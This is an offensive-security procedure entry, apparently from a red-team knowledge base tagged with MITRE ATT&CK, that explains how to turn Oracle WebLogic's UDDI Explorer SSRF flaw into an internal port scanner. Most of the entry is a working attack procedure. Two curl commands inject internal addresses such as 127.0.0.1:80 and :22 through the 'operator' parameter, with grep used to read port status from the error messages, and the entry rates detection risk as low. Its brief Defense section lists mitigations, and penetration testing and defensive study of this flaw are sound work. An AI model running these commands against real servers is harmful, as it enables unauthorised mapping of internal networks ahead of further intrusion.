---
tags:
  - ssrf
  - weblogic
  - uddi
  - reconnaissance
type: procedure
tools: []
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/curl-ssrf-analyze]]'
verified: false
platforms:
  - Web
  - Oracle WebLogic
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Active Scanning]]'
updated_at: '2025-12-14T04:39:02.479Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: bf379f8d-4115-4257-8971-88ad7a941816
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Active Scanning]]'
---
# Infer-Service-Availability-from-Response

## Summary

This procedure analyzes the verbose responses from SSRF exploitation to infer whether internal services are listening on targeted ports, effectively turning the vulnerability into a port scanner.

## Description

The WebLogic server's JSP page provides detailed error messages during failed connections, such as 'Connection refused' for closed ports or timeouts for firewalled ones. By comparing responses across multiple requests, attackers can map internal network topology and identify live services for further exploitation.

## Requirements

1. Successful SSRF triggers from prior procedure
2. Ability to parse HTML/ error responses
3. Scripting for automation if scaling scans

## Defense

Defensive measures and detection strategies:

- Suppress verbose error messages in WebLogic configurations
- Log and alert on repeated requests to UDDI with varying 'operator' values
- Implement response filtering to hide connection details

## Objectives

1. Determine port/service status
2. Gather internal network intelligence
3. Identify targets for escalation

## Instructions

### Step 1: Execute SSRF and Capture Response

**Context**: Send a targeted request and capture the full output for analysis.

**Command** ([[commands/curl-ssrf-analyze]]):
```bash
curl -G "http://target-server/uddiexplorer/SearchPublicRegistries.jsp" \
  -d "operator=http://127.0.0.1:80" \
  -d "rdoSearch=name" \
  -d "txtSearchname=sdf" \
  -v > response.html 2>&1
```

> The -v flag enables verbose mode to log connection details. Save output to file for review; look for phrases like 'java.net.ConnectException' indicating failures.

### Step 2: Parse for Indicators

**Context**: Manually or scriptually grep for success/failure cues.

**Command** ([[commands/curl-ssrf-analyze]]):
```bash
curl -G "http://target-server/uddiexplorer/SearchPublicRegistries.jsp" \
  -d "operator=http://127.0.0.1:22" \
  -d "rdoSearch=name" \
  -d "txtSearchname=sdf" | grep -i "refused\|timeout\|success"
```

> Grep filters key terms. 'Refused' suggests closed port; absence or different errors may indicate open services.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]] Reconnaissance

### Techniques

- [[Active Scanning]] Active Scanning

### Sub-Techniques


## Commands Used

- [[commands/curl-ssrf-analyze]]

## Tools Used


## Tags

- reconnaissance
- port-scanning
- response-analysis
